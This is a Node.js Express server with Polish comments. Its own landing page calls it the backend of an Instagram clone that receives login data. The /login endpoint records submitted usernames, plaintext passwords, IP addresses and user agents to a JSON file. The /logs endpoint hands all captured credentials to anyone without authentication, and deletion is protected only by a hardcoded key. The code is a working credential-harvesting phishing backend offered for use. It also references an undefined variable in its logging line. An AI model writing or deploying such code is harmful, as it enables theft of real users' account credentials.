const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(express.json());

// Zapisywanie danych logowania
app.post('/login', (req, res) => {
    const { username, password, timestamp, userAgent } = req.body;
    
    const logEntry = {
        id: Date.now(),
        username,
        password,
        timestamp,
        userAgent,
        ip: req.ip,
        date: new Date().toISOString()
    };
    
    // Zapis do pliku (na Renderze plik jest tymczasowy - lepiej użyć bazy danych)
    const logFile = path.join(__dirname, 'logins.json');
    let logs = [];
    
    if (fs.existsSync(logFile)) {
        try {
            const data = fs.readFileSync(logFile, 'utf8');
            logs = JSON.parse(data);
        } catch(e) {
            console.log('Błąd odczytu pliku:', e.message);
        }
    }
    
    logs.push(logEntry);
    fs.writeFileSync(logFile, JSON.stringify(logs, null, 2));
    
    console.log(`[${new Date().toISOString()}] Otrzymano logowanie: ${username} (${ip})`);
    res.json({ status: 'ok', message: 'Dane zapisane' });
});

// Endpoint do podglądu zapisanych danych
app.get('/logs', (req, res) => {
    const logFile = path.join(__dirname, 'logins.json');
    
    if (fs.existsSync(logFile)) {
        try {
            const logs = fs.readFileSync(logFile, 'utf8');
            const data = JSON.parse(logs);
            
            // Opcjonalnie: pokaż tylko ostatnie 10 logowań dla czytelności
            const last10 = data.slice(-10);
            
            res.json({
                total: data.length,
                last10: last10,
                all: data  // jeśli chcesz wszystkie dane
            });
        } catch(e) {
            res.status(500).json({ error: 'Błąd odczytu danych', details: e.message });
        }
    } else {
        res.json({ 
            total: 0, 
            message: 'Brak zapisanych danych. Nikt jeszcze się nie zalogował.' 
        });
    }
});

// Endpoint do czyszczenia wszystkich danych (opcjonalne - dla bezpieczeństwa)
app.delete('/logs', (req, res) => {
    const logFile = path.join(__dirname, 'logins.json');
    
    // Proste hasło zabezpieczające (możesz zmienić)
    const adminKey = req.headers['admin-key'];
    
    if (adminKey !== 'twoje-tajne-haslo123') {
        return res.status(403).json({ error: 'Brak autoryzacji' });
    }
    
    if (fs.existsSync(logFile)) {
        fs.writeFileSync(logFile, JSON.stringify([], null, 2));
        res.json({ status: 'ok', message: 'Wszystkie dane zostały usunięte' });
    } else {
        res.json({ message: 'Brak danych do usunięcia' });
    }
});

// Prosty endpoint testowy
app.get('/', (req, res) => {
    res.send(`
        <html>
            <head><title>Backend Instagram Clone</title></head>
            <body style="font-family: Arial; padding: 20px;">
                <h1>Backend działa! ✅</h1>
                <p>Serwer przyjmuje dane logowania z klonu Instagrama.</p>
                <h2>Endpointy:</h2>
                <ul>
                    <li><a href="/logs">/logs</a> - Podgląd zapisanych danych</li>
                    <li><code>POST /login</code> - Zapisywanie danych logowania</li>
                </ul>
                <p>Ilość zapisanych logowań: <strong id="count">loading...</strong></p>
                <script>
                    fetch('/logs')
                        .then(res => res.json())
                        .then(data => {
                            document.getElementById('count').textContent = data.total || 0;
                        })
                        .catch(err => console.error(err));
                </script>
            </body>
        </html>
    `);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`✅ Serwer działa na porcie ${PORT}`);
    console.log(`📝 Endpoint danych: http://localhost:${PORT}/logs`);
});
